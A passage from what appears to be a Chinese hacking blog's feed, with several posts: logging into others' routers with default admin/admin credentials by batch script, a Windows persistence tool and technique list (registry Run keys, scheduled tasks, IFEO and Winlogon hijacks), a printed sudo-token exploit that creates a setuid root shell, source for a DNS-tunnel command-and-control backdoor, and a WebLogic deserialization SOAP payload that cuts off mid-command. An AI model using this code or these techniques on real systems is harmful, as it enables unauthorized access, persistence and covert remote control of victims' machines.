src="https://s2.ax1x.com/2019/05/25/Vkg3Oe.md.png" alt=""></p><p>账号/密码：admin/admin，脚本批量走起！<br><img src="https://s2.ax1x.com/2019/05/25/VkWiSP.png" alt="VkWiSP.png"></p><p>登录之后可以直接管理<br><img src="https://s2.ax1x.com/2019/05/25/Vk2Vc8.md.png" alt=""></p><p>然后在某台路由器上发现个黑产分子<br><img src="https://s2.ax1x.com/2019/05/25/VkWRfI.md.png" alt=""></p><p>微步查了一下<br><img src="https://s2.ax1x.com/2019/05/25/VkW5X8.md.png" alt=""></p><p>还有个文件，下载用notepad++打开看了一下<br><img src="https://s2.ax1x.com/2019/05/25/VkWvcV.md.png" alt=""></p><p>在上传微步看了一下<br><img src="https://s2.ax1x.com/2019/05/25/Vkf974.md.png" alt=""></p><p>hash值：</p><pre><code>样本名称92363b85bf7879b88f961bd2b1af16daf44c7e8a8fd57e11dc381480dfd526da样本类型ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, stripped样本大小454640MD5b3b454a35d817890cd2aec73d7c659f9SHA1d7d70c4d1c25ae24d0d5962ea791f38a2afe41f6SHA25692363b85bf7879b88f961bd2b1af16daf44c7e8a8fd57e11dc381480dfd526daSSDeep12288:RajQZk3KMqSurunllNRw5q+V4kRNJrVgsaPrd:ocBMpzNRwseJr2Dd</code></pre><p>IP反查了一下<br><img src="https://s2.ax1x.com/2019/05/25/VkhaM6.md.png" alt=""></p><p>whois了一下<br><img src="https://s2.ax1x.com/2019/05/25/VkhXLT.md.png" alt=""></p><p>有几个站死了，还有几个活着的<br><img src="https://s2.ax1x.com/2019/05/25/VkhDde.md.png" alt=""></p><p>发现在新网注册的域名<br><img src="https://s2.ax1x.com/2019/05/25/Vk4CWR.md.png" alt=""></p><p>云悉查了一下<br><img src="https://s2.ax1x.com/2019/05/25/Vk4X9A.png" alt=""></p><p>咦，还有公司，叫：”响水九一网络科技有限公司“，这东西怕不是空壳公司吧</p><p>天眼查查了一下，现在改名叫：“江苏汉世汇创网络科技有限公司”<br><img src="https://s2.ax1x.com/2019/05/25/Vk5PAg.png" alt=""></p><p>大致看了一下，应该不是空壳公司<br><img src="https://s2.ax1x.com/2019/05/25/Vk5Zj0.png" alt=""></p><p>官方网站也有个8ihome.com 跳到了刚刚yt那个站<br><img src="https://s2.ax1x.com/2019/05/25/Vk52b8.png" alt="Vk52b8.png"></p><p>应该是劫持了，发现不能直接IP访问<br><img src="https://s2.ax1x.com/2019/05/25/VkINzn.md.png" alt=""></p><p>nmap扫描了一波，只有80…..<br><img src="https://s2.ax1x.com/2019/05/25/Vk7cWQ.md.png" alt=""></p><p>整理得到的信息：</p><pre><code>没有CDN端口80开放系统是Windowsphp7.x写的中间件是IISweb框架用的是Microsoft ASP.NET</code></pre><p>爆破个路径，爆出来的目录都是一片白，玩尼玛的头皮屑<br><img src="https://s2.ax1x.com/2019/05/25/VkLyBn.png" alt=""></p><p>这个东西估计是搞不下了，下次在搞，吃饭去了。。。</p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python权限维持-(碧鳞蛇)</title>
      <link href="/posts/91b15c6.html"/>
      <url>/posts/91b15c6.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上个星期写了一篇学习权限维持的博客，后面想了一会不如写个权限维持的工具吧。方便耍<br>所以就有了这篇文章,取名此工具为–碧鳞蛇</p><p><img src="http://pic.netbian.com/uploads/allimg/190505/152641-1557041201f908.jpg" alt=""></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>思路就是实现上篇文章所说的东西<br><img src="https://s2.ax1x.com/2019/05/19/EXLlsH.png" alt=""></p><p><b>指定进程检测</b>:</p><p>可以使用自定义的方法去检测是否有指定的进程，指定的文件要写成如下</p><pre><code>exe名称 - 注释例如:phpstudy.exe - phpstudy工具</code></pre><p>测试:<br><img src="https://s2.ax1x.com/2019/05/19/EXOemj.png" alt=""></p><p><b>修改注册表实现开机自启</b>:<br>以下路径可以实现开机自启<br><img src="https://s2.ax1x.com/2019/05/19/EXOMt0.png" alt=""></p><p>在指定注册表路径之前，会检测上图的注册表路径看看是否已存在后门<br><img src="https://s2.ax1x.com/2019/05/19/EXO31U.md.png" alt=""></p><p>选择一个序列添加注册表键值<br><img src="https://s2.ax1x.com/2019/05/19/EXOdtx.png" alt=""></p><p>重启或注销就能看到效果<br><img src="https://s2.ax1x.com/2019/05/19/EXOgHA.gif" alt=""></p><p><b>计划任务添加</b>:<br>可选项<br><img src="https://s2.ax1x.com/2019/05/19/EXOLEn.md.png" alt=""></p><p>选择分钟的<br><img src="https://s2.ax1x.com/2019/05/19/EXOzgU.md.png" alt=""></p><p>(这gif和上一个gif合并了，请耐心看完)<br><img src="https://s2.ax1x.com/2019/05/19/EXXFER.gif" alt=""></p><p><b>启动文件添加</b><br>输入要移动的文件路径，会移动到启动文件夹<br><img src="https://s2.ax1x.com/2019/05/19/EXXZ8K.png" alt=""></p><p>动图<br><img src="https://s2.ax1x.com/2019/05/19/EXXtxS.gif" alt=""></p><p><b>映像劫持</b>:<br><img src="https://s2.ax1x.com/2019/05/19/EXXyGV.gif" alt=""></p><p><b>Winlogon劫持</b>:<br><img src="https://s2.ax1x.com/2019/05/19/EXXOqH.gif" alt=""></p><p>注意:此操作有一定的风险，比如造成windows歇菜</p><p>无限重启…<br><img src="https://s2.ax1x.com/2019/05/19/EXjVds.png" alt=""></p><p>真优….<br><img src="https://s2.ax1x.com/2019/05/19/EXjlyF.md.png" alt=""></p><p><b>Appinit_DLls劫持</b>:<br><img src="https://s2.ax1x.com/2019/05/19/EjpPbD.md.png" alt=""></p><p>剩下的两个就不演示了，上学…</p><p>仓库地址:<a href="https://github.com/422926799/python/tree/master/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81" target="_blank" rel="noopener">Github-碧鳞蛇</a></p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>转载请声明：来自422926799.github.io<br>禁止做任何商业用途</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>持久化控制学习</title>
      <link href="/posts/26a6c441.html"/>
      <url>/posts/26a6c441.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上完六天学，获得为时不长的两天假期。真是太逊了，这那叫法定节日，简直亏死这假放的和学上的永远成不了正比。<br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1557640241465&amp;di=1231badace563a6ad561ddad6d8e6b8f&amp;imgtype=0&amp;src=http%3A%2F%2Fimgup04.iefans.net%2Fiefans%2F2019-03%2F17%2F10%2F15527901577165_0.jpg" alt=""></p><p>顺便说一下，这个月份叫做：<b>恶魔五月哭</b></p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=3&id=2060201656&auto=1&height=66"></iframe><h2 id="持久化控制学习"><a href="#持久化控制学习" class="headerlink" title="持久化控制学习"></a>持久化控制学习</h2><p><b>方法一：</b><br>向指定的注册表添加一个条目</p><ul><li>添加到运行注册表项的程序在System StartUo执行。<br>恶意软件可能会将自己添加到各种自动启动位置，下面是最常见的运行注册表项列表</li></ul><pre><code>HKCU\Software\Microsoft\Windows\CurrentVersion\RunHKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunHKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceHKCU\Software\Microsoft\Windows\CurrentVersion\RunOnceHKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RunHKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code></pre><p>实例：<br>在</p><pre><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer</code></pre><p>添加一个Run项，值设置为<br>C:\System32\calc.exe<br><img src="https://s2.ax1x.com/2019/05/11/EfsUb9.png" alt=""></p><p><b>方法二：</b><br>计划任务</p><ul><li>使用schtasks命令添加计划任务，在指定时间或开机或用户登录后执行</li></ul><p>使用到的命令</p><pre><code>schtasks</code></pre><p>schtasks命令详解:<a href="https://www.cnblogs.com/visoeclipse/archive/2009/08/29/1556240.html" target="_blank" rel="noopener">命令详解</a><br>schtasks常见错误:<a href="https://jingyan.baidu.com/article/4e5b3e19f5763391901e2493.html" target="_blank" rel="noopener">常见错误</a></p><p>实例：</p><pre><code>schtasks /create /sc ONLOGIN /tr C:\Windows\System32\notepad.exe /tn notepad</code></pre><p><img src="https://s2.ax1x.com/2019/05/11/EfRDPA.md.png" alt=""></p><p>设置每天指定时间内运行</p><pre><code>schtasks /create /sc daily /st 00:00:00 /tr C:\Windows\System32\calc.exe /tn demo3</code></pre><p><img src="https://s2.ax1x.com/2019/05/11/EfWCM6.png" alt=""></p><p>更多命令请点击上面命令详解</p><p>删除计划任务</p><pre><code>scthasks /Delete /TN 任务名称 /F</code></pre><p><img src="https://s2.ax1x.com/2019/05/11/EfW3dg.png" alt=""></p><p><b>方法三：</b><br>启动文件夹</p><ul><li>将要启动的东西放在启动文件夹，每次开机或重启都会运行</li></ul><p>启动文件夹的两个路径</p><pre><code>C:\Users\demo\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartupC:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</code></pre><p><img src="https://s2.ax1x.com/2019/05/11/EfWzTg.md.png" alt=""></p><p><b>方法四：</b><br>图像文件执行选项（映像劫持）</p><ul><li>图像文件执行选项允许直接在调试器下启动一个可执行文件。它为开发人员提供了调试其软件的选项，以便在可执行文件的启动代码中发现问题</li></ul><p>在</p><pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</code></pre><p>项下创建一个子项，子项的名称为你要劫持的exe名称，比如说notepad++.exe<br>然后创建一个值，值名为Debugger,值为要执行的恶意脚本路径<br><img src="https://s2.ax1x.com/2019/05/11/Efonzj.md.png" alt=""></p><p>劫持之后，在运行notepad++.exe就会弹出calc<br><img src="https://s2.ax1x.com/2019/05/11/EfoKQs.md.png" alt=""></p><p>参考文章:<a href="https://blog.csdn.net/u013761036/article/details/53290918" target="_blank" rel="noopener">映像劫持</a></p><p>注意：有安360的把360卸了，就算360退出了，主动防御还是在的，这个就会拦截你</p><p><b>方法四：</b><br>Winlogon registry entries注册表项</p><ul><li>攻击者可以通过修改winlogon进程使用的注册表项来实现持久性。</li></ul><blockquote><p>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit这个注册表键的作用是在用户进行登陆时，winlogon运行指定的程序。根据官方文档,可以更改它的值来添加与删除程序。</p></blockquote><p>参考文章：<a href="https://zhuanlan.zhihu.com/p/32403501" target="_blank" rel="noopener">利用userinit注册表键实现无文件后门</a><br>修改：</p><pre><code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code></pre><p>注册表键<br><img src="https://s2.ax1x.com/2019/05/12/EfLUSO.md.png" alt=""></p><p>重新登陆用户之后就会执行notepad<br><img src="https://s2.ax1x.com/2019/05/12/EfLD0A.md.png" alt=""></p><p>修改</p><pre><code>HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code></pre><p>也行</p><p>修改</p><pre><code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\shell</code></pre><p>启动的explorer.exe改为你要启动的(问题是:修改之后用户登录后不会运行explorer.exe，也显示不出桌面，很容易被发现)<br><img src="https://s2.ax1x.com/2019/05/12/EfLI7n.md.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/05/12/EfLOcF.md.png" alt=""></p><p>这么一搞环境好像tm崩了…噢，逊毙了<br>(windows修复中…..)</p><p><img src="https://s2.ax1x.com/2019/05/12/EfOZBd.md.png" alt=""></p><p><b>方法五：</b><br>通过映像劫持修改辅助功能，比如像什么放大镜，粘带键等</p><ul><li>当攻击者在登录的时候或已经登录的时候使用辅助功能将触发，攻击者所设置的后门</li></ul><p><img src="https://s2.ax1x.com/2019/05/12/EfzHhR.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/05/12/Efzq91.png" alt=""></p><p>当然你也可以直接替换掉原来sethc.exe</p><p><b>方法六：</b><br>应用程序劫持</p><ul><li>Windows中的applnit dlls功能提供了将自定义dlls加载到每个交互式应用程序的地址空间的方法。<br>一旦一个dll被加载到任何进程的地址空间中，它就可以在该进程的上下文中运行，并且可以挂接已知的API来实现替代功能。攻击者可以通过在下面的注册表项中设置applnit_dlls值来实现恶意dll的持久性。</li></ul><p>一旦修改了</p><pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\Applint_DLLs</code></pre><p>里的键值和启用加载之后，LoadApplnit_DLLs为1即为加载Applin_DLLs里的dll，所有有加载user.dll的进程里面都会有hook.dll</p><p><img src="https://s2.ax1x.com/2019/05/12/EhpEGR.md.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/05/12/EhpGRI.png" alt=""></p><p>参考文章:<a href="http://www.voidcn.com/article/p-fgwtywcx-kv.html" target="_blank" rel="noopener">Applnit_DLLs劫持</a></p><p>注意：当实验完之后记得删除注册表里面的设置和重启系统，如果不重启的话即便你删除了注册表里面的配置。任然会进行劫持</p><p><b>方法六：</b><br>DLL劫持</p><ul><li>程序加载DLL的时候会从上到下的搜索DLL如果中途把DLL给劫持为攻击者自己的DLL也能实现一个后门的效果</li></ul><p>注意：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs键值所写的DLL始终都从</p><pre><code>C:\Windows\System32C:\Windows\SystemC:\Windows当前目录path环境中的自定义目录</code></pre><p>如果你想保护某个DLL可以将其加入上述说的注册表路径中<br><img src="https://s2.ax1x.com/2019/05/12/EhPtQ1.png" alt=""></p><p>由于DLL劫持需要符合一定的要求这里不做实验，寻找一个程序是否缺少DLL的最好的方法就是使用某些工具检查或者自己使用Procmon来检查<br><img src="https://s2.ax1x.com/2019/05/12/EhPNsx.png" alt=""></p><p><b>方法七：</b><br>创建恶意服务与服务劫持</p><ul><li>攻击者可能以exe、dll或内核驱动程序的形式实现恶意程序，并以服务运行Windows支持各种服务类型</li></ul><p><img src="https://s2.ax1x.com/2019/05/12/EhFkgs.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/05/12/EhFYb6.png" alt=""></p><p>劫持aliide服务例子：<br><img src="https://s2.ax1x.com/2019/05/12/Ehk9qx.png" alt=""></p><p>创建一个恶意的aliide.sys驱动文件替换掉原来路径下的aliide.sys驱动</p><p>由于创建的服务在HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services项下都会创建一个子项，例如刚刚创建的update服务<br><img src="https://s2.ax1x.com/2019/05/12/EhkGWQ.png" alt=""></p><p>找到aliide,将start设置为2<br><img src="https://s2.ax1x.com/2019/05/12/Ehk0oT.md.png" alt=""></p><p>劫持后的服务<br><img src="https://s2.ax1x.com/2019/05/12/EhkrYF.png" alt=""></p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>转载请声明：来自422926799.github.io<br>禁止做任何商业用途</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sudo token提权</title>
      <link href="/posts/2b74b00d.html"/>
      <url>/posts/2b74b00d.html</url>
      <content type="html"><![CDATA[<h2 id="sudo-token提权"><a href="#sudo-token提权" class="headerlink" title="sudo token提权"></a>sudo token提权</h2><p>昨日在安全热点中见到一个说到sudo的token<br>来获得root权限</p><p>Referer:<a href="https://paper.tuisec.win/detail/8cebac7cd7f4a83" target="_blank" rel="noopener">sudo token提权</a><br>仓库地址:<a href="https://github.com/nongiach/sudo_inject" target="_blank" rel="noopener">https://github.com/nongiach/sudo_inject</a></p><h2 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h2><pre><code>Ptrace完全启用（/ proc / sys / kernel / yama / ptrace_scope == 0）。当前用户必须具有具有相同uid的有效sudo令牌的生活进程。</code></pre><p><img src="https://s2.ax1x.com/2019/05/04/EaJwNj.png" alt=""></p><h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><p>下载上面所说的仓库地址，在本地执行echo 0 &gt; /proc/sys/kernel/yama/ptrace_scope模拟一个环境<br><img src="https://s2.ax1x.com/2019/05/04/EaJyvV.png" alt=""><br>执行以下两条命令，你将获得一个root权限的终端</p><pre><code>sh exploit_v2.sh/tmp/sh -p</code></pre><p><img src="https://s2.ax1x.com/2019/05/04/EaYMrT.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/05/04/EaY3a4.png" alt=""></p><p>看了一下exploit_v2.sh里的利用代码</p><pre><code># create suid shellecho &quot;Creating suid shell in /tmp/sh&quot;echo &quot;Current process : $$&quot;# inject all shell belonging to the current user, our shell one :pfor pid in $(pgrep &#39;^(ash|ksh|csh|dash|bash|zsh|tcsh|sh)$&#39; -u &quot;$(id -u)&quot; | grep -v &quot;^$$\$&quot;)do        echo &quot;Injecting process $pid -&gt; &quot;$(cat &quot;/proc/$pid/comm&quot;)    echo &#39;call system(&quot;echo | sudo -S cp /bin/sh /tmp &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo | sudo -S chmod +s /tmp/sh &gt;/dev/null 2&gt;&amp;1&quot;)&#39; \        | gdb -q -n -p &quot;$pid&quot; &gt;/dev/null 2&gt;&amp;1done</code></pre><p>文章还有其他的操作，详情请看仓库地址</p><p><img src="https://s2.ax1x.com/2019/05/04/EaYveU.png" alt=""></p><hr><p>你可以自由地：<br>分享 – 在任何媒介或格式下再分发、传播本创作。<br>只要遵守下述条款规定，授权人将不能撤回你使用本创作的自由。<br>唯须遵循以下条款：<br>署名 – 你必须以给予姓名标注，并提供本许可证的链接。同时你需要声明公开的创作是否经过修改。你可以采用恰当的形式将相关信息表述出来，但不得以任何形式暗示授权人已正式认可了你以及你的使用行为。<br>非商业性 – 你不得将本创作运用于商业目的。<br>禁止演绎 – 如果你对本创作进行了重混、转换、依据本创作进行再创作等行为，你不得再次公开散布经过修改的创作。<br>不得增加额外限制 – 你不能增设任何法律限制或是技术限制，来限制他人进行本许可证已经允许的行为。</p><p>声明：<br>当你使用本创作中属于公众领域的元素，或当法律有额外或限制条款允许你的使用行为时，则你不需要遵守本授权协议。</p><p>不提供保证。本授权协议并不能完全提供你预期需要的所有许可，例如：公共形象权，隐私权，著作人身权等其他权利，这些权利的法律限制可能会限制你使用本创作。</p>]]></content>
      
      
        <tags>
            
            <tag> Linux提权 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>一个很像cxk的dns_c2</title>
      <link href="/posts/126651c2.html"/>
      <url>/posts/126651c2.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>算是一个很像cxk的东西，有个BUG一直解决不了<br>而且还时不时的像报错。。。。emmmm<br><img src="http://img4.imgtn.bdimg.com/it/u=1940277742,2702113996&amp;fm=26&amp;gp=0.jpg" alt=""></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>五一之前在sec-wiki看到某文章<br>传送门:<a href="https://www.cnblogs.com/LittleHann/p/8656621.html" target="_blank" rel="noopener">DNS Tunnel隧道隐蔽通信实验 &amp;&amp; 尝试复现特征向量化思维方式检测</a><br>根据文章所描述的，我这个c2应该属于第一种</p><p>我在写之前上GitHub搜了一下dns shell找到了一个不错的项目<br>传送门:<a href="https://github.com/ahhh/Reverse_DNS_Shell/" target="_blank" rel="noopener">DNS_Shell</a></p><p>根据上面项目所用到的东西</p><pre><code class="`">dnslib模块 --- 处理dns包dnspython --- 发送dns请求</code></pre><p>当然你也可以用scapy手动构造一个dns的数据包然后在发送出去….</p><p>项目里面接收dns包的时候是用socket创建一个UDP，然后监听53端口，监听数据<br>获取到的数据使用dnslib，模块进行解包便可获得想要的数据</p><p>dns_shell算是个反向shell，必须由客户端发送请求。服务端回应该数据<br>虽然写的时候有点困难。我是实现第一种c2，使用的是TXT记录类型。TXT类型有限制数据不能大于63个字节<br>所以必须得分段发送</p><h2 id="实现他"><a href="#实现他" class="headerlink" title="实现他"></a>实现他</h2><p><b>Server端</b><br>解dns包的函数</p><pre><code class="python">    def dnsj(self,data):        dr=dnslib.DNSRecord.parse(data) #dns数据包转换        answer=dr.reply() #获取全部数据        return answer,dr.questions[0].qname.label[0] #获取请求前的dns包和指定数据</code></pre><p>打包为dns包的函数</p><pre><code class="python">    def dnsc(self,answer,data):        answer.add_answer(*dnslib.RR.fromZone(&#39;{}.com 60 TXT&#39;.format(data)))        return answer</code></pre><p>主要函数</p><pre><code class="python"> global s,address        he = [&#39;cmd---&gt;命令行交互&#39;,&#39;upload---&gt;文件上传&#39;,&#39;download---&gt;文件下载&#39;,&#39;exit---&gt;退出&#39;]        hps={&#39;cmd&#39;: self.cmd,&#39;upload&#39;:self.upload,&#39;download&#39;:self.download,&#39;exit&#39;:exit}        s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)        s.bind((self.host,int(self.port)))        data,address=s.recvfrom(1024)        print(&#39;[+] 来源IP:{},来源端口:{}&#39;.format(address[0],address[1]))        dnsj=self.dnsj(data)        demo=self.jiemi(dnsj[1])        if demo:            print(&#39;[+] {}:{}&lt;----&gt;{}:{}&#39;.format(self.host,self.port,address[0],address[1]))            print(&#39;+请执行你的操作，如果有问题请输入help&#39;)            demos=self.jiami(&#39;demo&#39;)            fs=self.dnsc(dnsj[0],demos)            s.sendto(fs.pack(),address)            while True:                xw=input(&#39;Jarvis:&#39;)                if xw in hps:                    try:                        hps[xw]()                    except Exception as r:                        print(&#39;-- Error:{}&#39;.format(r))                elif xw==&#39;help&#39;:                    print(&#39;&#39;)                    for h in he:                        print(h)                else:                    print(&#39;-没有这种操作&#39;)                    continue</code></pre><p><b>Client端</b><br>主要函数</p><pre><code class="python"> def beikon(self):        hk={&#39;cmd&#39;:self.cmd,&#39;upload&#39;:self.upload,&#39;download&#39;:self.download}        demo=&#39;demo&#39;        demo=self.jiami(demo)        bbc=self.fs(demo)        kk=self.zz(bbc)        jm=self.jiemi(kk.encode(&#39;utf-8&#39;))        if jm:            while True:                try:                    g=&#39;ok&#39;                    demo = self.jiami(g)                    bbc = self.fs(demo)                    kk = self.zz(bbc)                    jm = self.jiemi(kk.encode(&#39;utf-8&#39;))                    if jm in hk:                        hk[jm]()                except:                    pass</code></pre><p><b>对应功能对照的函数</b><br>命令行交互<br>server端</p><pre><code class="python"> def cmd(self):        self.ok(&#39;cmd&#39;)        while True:            jb, jc = s.recvfrom(1024)            dnsj = self.dnsj(jb)            demo = self.jiemi(dnsj[1])            if demo!=&#39;cmd&#39; and demo !=&#39;long&#39;:                print(demo)                demos = self.jiami(&#39;cmd&#39;)                fs = self.dnsc(dnsj[0], demos)                s.sendto(fs.pack(), jc)            elif demo==&#39;long&#39;:                changdu=0                jg=b&#39;&#39;                demos = self.jiami(&#39;long&#39;)                fs = self.dnsc(dnsj[0], demos)                s.sendto(fs.pack(), jc)                c,d= s.recvfrom(1024)                dnsj = self.dnsj(c)                demo=self.jiemi(dnsj[1])                if str(demo).isdigit()==True:                    changdu+=int(demo)                print(changdu)                demos = self.jiami(&#39;{}&#39;.format(changdu))                fs = self.dnsc(dnsj[0], demos)                s.sendto(fs.pack(), d)                while True:                    d,e = s.recvfrom(1024)                    dnsj = self.dnsj(d)                    jg+=dnsj[1]                    if len(jg)==changdu:                        jmk=self.jiemi(jg)                        print(jmk)                        fs = self.dnsc(dnsj[0], &#39;break&#39;)                        s.sendto(fs.pack(), e)                        break                    demos = self.jiami(&#39;jx&#39;)                    fs = self.dnsc(dnsj[0], demos)                    s.sendto(fs.pack(), e)            else:                shell=input(&#39;Jarvis_shell:&#39;)                if shell==&#39;exit&#39;:                    demos = self.jiami(&#39;exit&#39;)                    fs = self.dnsc(dnsj[0], demos)                    s.sendto(fs.pack(), jc)                    break                demos = self.jiami(shell)                fs = self.dnsc(dnsj[0], demos)                s.sendto(fs.pack(), jc)</code></pre><p>client端</p><pre><code class="python">    def cmd(self):        while True:            g=&#39;cmd&#39;            demo = self.jiami(g)            bbc = self.fs(demo)            kk = self.zz(bbc)            jm = self.jiemi(kk.encode(&#39;utf-8&#39;))            if jm == &#39;exit&#39;:                break            else:                zx=os.popen(jm)                if zx:                    g=zx.read()                    demos = self.jiami(g)                    if len(demos)&lt;64:                        if len(demos)==0:                            demos=self.jiami(jm)                        bbc = self.fs(demos)                        kk = self.zz(bbc)                        jm = self.jiemi(kk.encode(&#39;utf-8&#39;))                        if jm:                            continue                    else:                        g=&#39;long&#39;                        demo = self.jiami(g)                        bbc = self.fs(demo)                        kk = self.zz(bbc)                        jm = self.jiemi(kk.encode(&#39;utf-8&#39;))                        if jm:                            g = len(demos)                            demo = self.jiami(g)                            bbc = self.fs(demo)                            kk = self.zz(bbc)                            jm = self.jiemi(kk.encode(&#39;utf-8&#39;))                            if jm:                                b=0                                e=32                                for u in demos:                                    g=demos[b:e]                                    b+=32                                    e+=32                                    bbc=self.fs(g)                                    kk = self.zz(bbc)                                    if kk==&#39;break&#39;:                                        break</code></pre><p><b>仓库地址</b>:<a href="https://github.com/422926799/python/tree/master/dns_c2" target="_blank" rel="noopener">https://github.com/422926799/python/tree/master/dns_c2</a></p><h2 id="测试截图"><a href="#测试截图" class="headerlink" title="测试截图"></a>测试截图</h2><p><img src="https://s2.ax1x.com/2019/05/02/ENMlz4.gif" alt=""></p><p><img src="https://s2.ax1x.com/2019/05/02/ENM8y9.gif" alt=""></p><p><img src="https://s2.ax1x.com/2019/05/02/ENMGLR.gif" alt=""></p><p><img src="https://s2.ax1x.com/2019/05/02/ENMYe1.gif" alt=""></p><p><b>抓包截图</b><br><img src="https://s2.ax1x.com/2019/05/02/ENMtdx.gif" alt=""></p><p>转载请声明:转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>weblogic新反序列化rce复现</title>
      <link href="/posts/8b237c5b.html"/>
      <url>/posts/8b237c5b.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>据说又有新的weblogic反序列化爆出来了？滑稽<br>既然如此我来蹭波热度<br><img src="https://s2.ax1x.com/2019/04/26/EnlrIx.png" alt=""></p><p><b>BGM:女王蜂</b></p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=549680151&auto=1&height=66"></iframe><h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><p>根据此文章进行复现:<a href="https://www.jianshu.com/p/c4982a845f55" target="_blank" rel="noopener">https://www.jianshu.com/p/c4982a845f55</a></p><p><b>环境准备</b></p><pre><code>使用vulhub里的CVE-2017-10271进行复现进入对应的文件夹执行docker-compose up -d</code></pre><p><img src="https://s2.ax1x.com/2019/04/26/En3SnH.png" alt=""></p><p>访问<a href="http://127.0.0.1:7001" target="_blank" rel="noopener">http://127.0.0.1:7001</a><br><img src="https://s2.ax1x.com/2019/04/26/En3DC6.png" alt=""></p><p>根据上面的文章一开始请求:</p><pre><code>http://192.168.241.132:7001/_async/AsyncResponseService</code></pre><p><img src="https://s2.ax1x.com/2019/04/26/En8pxU.md.png" alt=""><br>如果页面如上图所示，表示可能存在漏洞</p><p>根据文章中的写webshell第一种方式</p><pre><code>POST /_async/AsyncResponseService HTTP/1.1Host: 192.168.241.132:7001Content-Length: 1383Accept-Encoding: gzip, deflateSOAPAction: Accept: */*User-Agent: Apache-HttpClient/4.1.1 (java 1.5)Connection: keep-alivecontent-type: text/xml&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;   &lt;soapenv:Header&gt; &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;&lt;void index=&quot;0&quot;&gt;&lt;string&gt;/bin/bash&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;1&quot;&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;2&quot;&gt;&lt;string&gt;echo 